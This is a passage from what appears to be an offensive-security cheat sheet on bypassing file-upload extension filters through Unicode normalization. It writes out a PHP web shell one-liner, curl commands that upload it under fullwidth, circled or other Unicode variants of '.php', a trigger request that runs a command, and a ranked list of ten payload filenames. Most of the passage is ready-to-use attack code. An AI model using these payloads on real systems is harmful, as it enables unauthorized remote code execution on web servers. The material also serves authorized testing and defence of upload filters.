  echo '<?php system($_GET["cmd"]); ?>' > shell.php

  # Upload with fullwidth PHP extension
  curl -X POST https://target.com/upload \
    -F "file=@shell.php;filename=shell.ｐｈｐ" \
    -H "Cookie: session=TOKEN" -v

  # Trigger (try normalized name)
  curl "https://target.com/uploads/shell.php?cmd=id"
  ```
  :::

  :::card
  ---
  icon: i-lucide-list-ordered
  title: Priority Order
  ---
  1. Fullwidth single char: `shell.phｐ`
  2. Fullwidth full ext: `shell.ｐｈｐ`
  3. Circled single char: `shell.phⓟ`
  4. Circled full ext: `shell.ⓟⓗⓟ`
  5. Mixed types: `shell.ⓟｈⓟ`
  6. Fullwidth dot: `shell．php`
  7. Fullwidth dot + ext: `shell．ｐｈｐ`
  8. Superscript: `shell.ᵖʰᵖ`
  9. Subscript: `shell.ₚhₚ`
  10. Math variants: `shell.𝐩𝐡𝐩`
  :::

  :::card
  ---
  icon: i-lucide-scan
  title: Detection Indicators
  ---
  - **NFKC normalizes to dangerous ext**: File stored with executable extension
  - **Upload returns 200 + path**: Normalization likely happened
  - **ASCII filename accessible**: File system normalized the name
  - **Unicode filename accessible**: No normalization, stored as-is
  - **Both accessible**: Possible aliasing
  - **Neither accessible**: File rejected or stored elsewhere
  :::

  :::card
  ---
  icon: i-lucide-wrench
  title: Essential Commands
  ---
  ```bash
  # Test normalization
  python3 -c "import unicodedata; print(unicodedata.normalize('NFKC', 'shell.ⓟⓗⓟ'))"

  # Upload fullwidth
  curl -X POST URL -F "file=@shell.php;filename=shell.ｐｈｐ"

  # Upload circled
  curl -X POST URL -F "file=@shell.php;filename=shell.ⓟⓗⓟ"

  # Access normalized
  curl "URL/uploads/shell.php?cmd=id"

  # Hex dump filename for verification
  echo -n "shell.ⓟⓗⓟ" | xxd
  ```
  :::
::